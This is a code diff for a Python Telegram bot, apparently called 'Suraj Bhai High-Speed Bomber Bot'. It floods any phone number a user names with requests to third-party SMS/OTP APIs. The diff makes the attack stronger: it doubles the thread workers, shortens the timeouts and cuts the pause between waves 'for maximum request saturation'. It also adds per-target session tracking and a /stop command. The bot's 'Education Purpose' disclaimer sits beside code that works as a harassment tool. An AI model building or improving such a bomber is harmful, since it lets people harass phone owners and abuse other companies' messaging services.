@@ -29,11 +29,14 @@ def home():
 def run_flask():
     flask_app.run(host='0.0.0.0', port=8080)
 
-# Global tracking variables for live stats
+# Global tracking variables for live stats & active targets tracking
 BOMBER_STATS = {
     "total_requests_sent": 0,
     "active_targets": 0
 }
+
+# Dictionary to manage active bombing sessions per phone number
+active_bombing_sessions = {}
 
 # List of APIs provided for request execution
 APIS = [
@@ -65,6 +68,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Yeh bot sirf aur sirf **Education Purpose** aur security/stress testing ke liye banaya gaya hai.\n\n"
         f"🚀 **Available Commands:**\n"
         f"👉 `/bomb <phone_number>` - High-speed multi-threaded requests shuru karne ke liye.\n"
+        f"👉 `/stop <phone_number>` - Specific target number ki bombing rokne ke liye.\n"
         f"👉 `/stats` - Live request delivery status check karne ke liye.\n\n"
         f"👑 *Powered By:* {CHANNEL_SIGNATURE}"
     )
@@ -77,7 +81,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"━━━━━━━━━━━━━━━━━━━\n"
         f"🔄 Total Requests Sent: `{BOMBER_STATS['total_requests_sent']}`\n"
         f"🎯 Active Targets in Queue: `{BOMBER_STATS['active_targets']}`\n"
-        f"⚡ Status: High-Speed Threaded Running\n"
+        f"⚡ Status: High-Speed Multi-Threaded Running\n"
         f"👑 Powered By: {CHANNEL_SIGNATURE}"
     )
     await update.message.reply_text(stats_msg, parse_mode="Markdown")
@@ -89,16 +93,16 @@ def send_single_request(api, target_phone):
         headers = api["headers"]
         
         if api["method"] == "GET":
-            requests.get(url, headers=headers, timeout=3)
+            requests.get(url, headers=headers, timeout=2.5)
         elif api["method"] == "POST":
             data = api["data"](target_phone, "60")
-            requests.post(url, headers=headers, data=data, timeout=3)
+            requests.post(url, headers=headers, data=data, timeout=2.5)
         
         BOMBER_STATS["total_requests_sent"] += 1
     except Exception:
         pass
 
-# /bomb command handler with ThreadPoolExecutor for high speed
+# /bomb command handler with high speed ThreadPoolExecutor
 async def handle_bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         await update.message.reply_text(
@@ -118,35 +122,73 @@ async def handle_bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         )
         return
 
+    if target_phone in active_bombing_sessions and active_bombing_sessions[target_phone]:
+        await update.message.reply_text(
+            f"⚠️ **Target `{target_phone}` par bombing pehle se hi chal rahi hai!**",
+            parse_mode="Markdown"
+        )
+        return
+
+    active_bombing_sessions[target_phone] = True
     BOMBER_STATS["active_targets"] += 1
     
-    status_msg = await update.message.reply_text(
+    await update.message.reply_text(
         f"🎯 **Target Number:** `{target_phone}`\n"
-        f"⚡ **Status:** High-speed multi-threaded requests bheji ja rahi hain...",
+        f"⚡ **Status:** Ultra High-Speed Multi-Threaded Bombing Started!\n"
+        f"🛑 *Rokne ke liye likhein:* `/stop {target_phone}`",
         parse_mode="Markdown"
     )
     
-    # Run in background thread using ThreadPoolExecutor for concurrent speed
+    # Run in background thread using ThreadPoolExecutor for high speed concurrent requests
     threading.Thread(
         target=run_threaded_bomber, 
-        args=(target_phone, context, update.effective_chat.id)
+        args=(target_phone,)
     ).start()
 
-def run_threaded_bomber(target_phone, context, chat_id):
+def run_threaded_bomber(target_phone):
     try:
-        # Infinite fast loop using ThreadPoolExecutor to fire requests parallelly
-        while True:
-            with ThreadPoolExecutor(max_workers=10) as executor:
+        # High speed parallel execution loop using larger max_workers for ultra speed
+        while active_bombing_sessions.get(target_phone, False):
+            with ThreadPoolExecutor(max_workers=20) as executor:
                 for api in APIS:
+                    if not active_bombing_sessions.get(target_phone, False):
+                        break
                     executor.submit(send_single_request, api, target_phone)
             
-            # Short pause between waves to prevent local thread choking
-            time.sleep(1.5)
+            # Minimal pause for maximum request saturation
+            time.sleep(0.3)
             
     except Exception as e:
-        print(f"❌ Error in threaded loop: {e}")
+        print(f"❌ Error in threaded loop for {target_phone}: {e}")
     finally:
-        BOMBER_STATS["active_targets"] -= 1
+        if active_bombing_sessions.get(target_phone, False):
+            active_bombing_sessions[target_phone] = False
+            BOMBER_STATS["active_targets"] -= 1
+
+# /stop command handler to terminate bombing for a specific number only
+async def handle_stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text(
+            "❌ **Kripya woh mobile number dein jise rokna hai!**\n\n"
+            "📌 *Example:* `/stop 9876543210`",
+            parse_mode="Markdown"
+        )
+        return
+    
+    target_phone = context.args[0].strip()
+
+    if target_phone in active_bombing_sessions and active_bombing_sessions[target_phone]:
+        active_bombing_sessions[target_phone] = False
+        BOMBER_STATS["active_targets"] = max(0, BOMBER_STATS["active_targets"] - 1)
+        await update.message.reply_text(
+            f"🛑 **SUCCESS:** Target `{target_phone}` ki bombing successfully rok di gayi hai!",
+            parse_mode="Markdown"
+        )
+    else:
+        await update.message.reply_text(
+            f"⚠️ **Is number (`{target_phone}`) par koi active bombing nahi chal rahi hai.**",
+            parse_mode="Markdown"
+        )
 
 def main():
     flask_thread = threading.Thread(target=run_flask)
@@ -158,6 +200,7 @@ def main():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stats", stats_command))
     app.add_handler(CommandHandler("bomb", handle_bomb_command))
+    app.add_handler(CommandHandler("stop", handle_stop_command))
 
     print(f"🤖 Suraj Bhai High-Speed Bomber Bot is up and running [Powered by {CHANNEL_SIGNATURE}]...")
     app.run_polling()
